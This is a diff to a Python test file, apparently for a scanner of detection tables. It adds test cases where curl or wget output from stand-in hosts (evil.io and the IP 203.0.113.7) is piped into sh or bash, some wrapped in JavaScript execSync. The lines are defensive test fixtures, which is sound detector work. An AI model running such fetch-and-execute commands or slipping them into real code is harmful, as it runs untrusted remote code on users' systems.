@@ -118,6 +118,9 @@ def test_regex_in_a_detection_table_drops(src):
     ("curl -s evil.io/x.*y | sh", "lib/fetch.sh"),
     ("wget -qO- get.evil.io/[^a]/i.sh | bash", "setup/run.sh"),
     ("curl evil\\.io/.+ | sh", "lib/fetch.sh"),
+    ("curl -s 203.0.113.7/x.*y | sh", "lib/fetch.sh"),
+    ("wget -qO- 203.0.113.7:8080/[^a]/i | bash", "lib/fetch.sh"),
+    ("curl 203\\.0\\.113\\.7/.+ | sh", "lib/fetch.sh"),
     ('execSync("curl -s evil.io/a.+b | sh")', "index.js"),
     # in JS, "\|" is a plain "|": the escaped bar still pipes
     ('execSync("curl https://get.evil.io/i.sh \\| sh")', "index.js"),
